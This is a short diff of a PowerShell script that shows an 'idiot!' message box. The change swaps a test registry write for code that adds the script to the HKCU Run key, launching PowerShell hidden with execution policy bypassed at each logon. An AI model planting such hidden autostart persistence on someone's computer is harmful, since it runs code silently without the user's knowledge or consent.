@@ -1,9 +1,13 @@
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show("idiot!", "Greeting")
+# Set the path to the script or executable
+$scriptPath = "C:\Users\YourUserName\Documents\myscript.ps1"
 
-regkey='HKCU:\Control Panel\Desktop\NewKey'
-$regparam='testparameter'
-if (Get-ItemProperty -Path $regkey -Name $regparam -ErrorAction Ignore)
-{ write-host 'The registry entry already exist' }
-else
-{ New-ItemProperty -Path $regkey -Name $regparam -Value ”woshub_test”  -PropertyType "String"  }
+# Set a name for the registry entry
+$regName = "MyPersistentScript"
+
+# Add to HKCU Run key
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                 -Name $regName `
+                 -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" `
+                 -PropertyType String
